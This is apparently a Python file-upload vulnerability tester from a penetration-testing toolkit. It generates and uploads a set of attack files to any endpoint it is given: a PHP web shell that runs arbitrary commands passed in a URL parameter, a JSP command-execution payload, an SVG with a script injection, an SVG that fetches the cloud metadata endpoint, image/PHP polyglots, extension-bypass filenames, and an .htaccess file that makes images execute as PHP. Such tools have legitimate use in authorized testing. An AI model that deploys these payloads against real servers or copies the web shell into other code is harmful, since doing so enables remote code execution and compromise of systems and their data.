#!/usr/bin/env python3
"""File upload vulnerability tester — extension bypass, MIME type bypass, polyglot generation."""
import argparse
import requests
import json
import sys
import os
import tempfile
import urllib3
urllib3.disable_warnings()

PHP_SHELL = '<?php echo "CYBERSTRIKE_RCE_TEST"; system($_GET["cmd"]); ?>'
JSP_SHELL = '<%= Runtime.getRuntime().exec("id") %>'
SVG_XSS = '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert("XSS")</script></svg>'
SVG_SSRF = '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://169.254.169.254/latest/meta-data/"/></svg>'

GIF_HEADER = b"GIF89a"
PNG_HEADER = b"\x89PNG\r\n\x1a\n"
JPEG_HEADER = b"\xff\xd8\xff\xe0"

def generate_payloads():
    payloads = []
    # Extension bypass variants
    for ext in [".php", ".php5", ".phtml", ".pHp", ".php.jpg", ".php%00.jpg",
                ".php;.jpg", ".php.png", ".php.", ".php::$DATA",
                ".jsp", ".jspx", ".asp", ".aspx", ".shtml",
                ".py", ".rb", ".pl", ".cgi", ".sh"]:
        payloads.append({
            "name": f"shell{ext}",
            "content": PHP_SHELL.encode() if "php" in ext.lower() else JSP_SHELL.encode(),
            "content_type": "image/jpeg",
            "description": f"Extension bypass: {ext} with image MIME type",
        })

    # Polyglot: valid image header + PHP code
    for header, img_ext in [(GIF_HEADER, "gif"), (PNG_HEADER, "png"), (JPEG_HEADER, "jpg")]:
        payloads.append({
            "name": f"polyglot.{img_ext}.php",
            "content": header + PHP_SHELL.encode(),
            "content_type": f"image/{img_ext}",
            "description": f"Polyglot: valid {img_ext} header + PHP shell",
        })

    # SVG with XSS
    payloads.append({
        "name": "xss.svg",
        "content": SVG_XSS.encode(),
        "content_type": "image/svg+xml",
        "description": "SVG with embedded JavaScript (XSS)",
    })

    # SVG with SSRF
    payloads.append({
        "name": "ssrf.svg",
        "content": SVG_SSRF.encode(),
        "content_type": "image/svg+xml",
        "description": "SVG with SSRF (requests metadata endpoint)",
    })

    # HTML as image
    payloads.append({
        "name": "xss.html",
        "content": b"<html><body><script>alert('XSS')</script></body></html>",
        "content_type": "image/jpeg",
        "description": "HTML file with image MIME type",
    })

    # .htaccess override
    payloads.append({
        "name": ".htaccess",
        "content": b"AddType application/x-httpd-php .jpg",
        "content_type": "text/plain",
        "description": ".htaccess to make .jpg execute as PHP",
    })

    return payloads

def test_upload(url, field_name, payload, headers, extra_fields=None):
    try:
        with tempfile.NamedTemporaryFile(delete=False, suffix=payload["name"]) as f:
            f.write(payload["content"])
            f.flush()
            tmp_path = f.name

        files = {field_name: (payload["name"], open(tmp_path, "rb"), payload["content_type"])}
        data = extra_fields or {}
        resp = requests.post(url, files=files, data=data, headers=headers, verify=False, timeout=15)
        os.unlink(tmp_path)

        accepted = resp.status_code in [200, 201, 302]
        return {
            "filename": payload["name"],
            "description": payload["description"],
            "status": resp.status_code,
            "accepted": accepted,
            "response_preview": resp.text[:300] if accepted else "",
        }
    except Exception as e:
        return {"filename": payload["name"], "error": str(e)}

def main():
    parser = argparse.ArgumentParser(description="File upload vulnerability tester")
    parser.add_argument("url", help="Upload endpoint URL")
    parser.add_argument("--field", default="file", help="Form field name for file (default: file)")
    parser.add_argument("-H", "--header", action="append", default=[])
    parser.add_argument("--data", default=None, help="Extra form fields as JSON")
    parser.add_argument("--json-output", action="store_true")
    args = parser.parse_args()

    headers = {"User-Agent": "Mozilla/5.0"}
    for h in args.header:
        k, v = h.split(":", 1)
        headers[k.strip()] = v.strip()

    extra = json.loads(args.data) if args.data else None
    payloads = generate_payloads()

    print(f"\nFile Upload Tester: {args.url}")
    print(f"Field: {args.field} | Payloads: {len(payloads)}")
    print(f"{'='*60}\n")

    results = []
    for payload in payloads:
        result = test_upload(args.url, args.field, payload, headers, extra)
        results.append(result)
        icon = "[ACCEPTED]" if result.get("accepted") else "[BLOCKED] "
        print(f"  {icon} {result['filename']:30s} — {result.get('description', '')}")

    accepted = [r for r in results if r.get("accepted")]
    print(f"\n{'='*60}")
    print(f"Results: {len(accepted)}/{len(results)} payloads accepted")
    if accepted:
        print(f"\nAccepted uploads (verify RCE/XSS manually):")
        for r in accepted:
            print(f"  - {r['filename']}: {r['description']}")

    if args.json_output:
        print(json.dumps({"url": args.url, "accepted": accepted, "total": len(results)}, indent=2))

if __name__ == "__main__":
    main()
